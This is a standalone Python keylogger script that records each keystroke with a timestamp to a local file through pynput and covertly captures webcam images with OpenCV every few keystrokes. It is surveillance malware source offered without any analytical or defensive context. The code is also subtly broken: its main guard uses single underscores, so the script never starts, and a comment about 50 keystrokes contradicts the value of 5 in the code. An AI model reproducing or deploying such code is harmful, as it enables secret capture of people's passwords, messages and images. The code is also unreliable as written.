import cv2
from pynput import keyboard
import os
import time

# Create the log file if it doesn't exist
def create_log_file():
    log_file = "keylog.txt"
    if not os.path.isfile(log_file):
        with open(log_file, "w") as file:
            file.write("Keystroke Log\n")
            file.write("=" * 30 + "\n\n")
    return log_file

# Log keystroke to the log file
def log_keystroke(key, log_file):
    try:
        keystroke = str(key.char)
    except AttributeError:
        keystroke = str(key)
    with open(log_file, "a") as file:
        file.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {keystroke}\n")

# Capture an image using the webcam
def capture_image():
    # Initialize the webcam
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    
    if ret:
        # Create a folder for images if it doesn't exist
        if not os.path.exists("captured_images"):
            os.makedirs("captured_images")
        
        # Create a filename based on the current timestamp
        image_filename = f"captured_images/img_{time.strftime('%Y%m%d_%H%M%S')}.png"
        cv2.imwrite(image_filename, frame)  # Save the image to the folder

    cap.release()
    cv2.destroyAllWindows()

# Define the function that runs when a key is pressed
def on_press(key):
    log_keystroke(key, log_file)
    
    # Capture an image every 50 keystrokes (adjust as needed)
    on_press.counter += 1
    if on_press.counter % 5 == 0:
        capture_image()

# Initialize the counter
on_press.counter = 0

# Define the function that runs when a key is released
def on_release(key):
    # Stop the keylogger when 'Esc' key is pressed
    if key == keyboard.Key.esc:
        return False

if _name_ == "_main_":
    # Create or get the log file
    log_file = create_log_file()

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()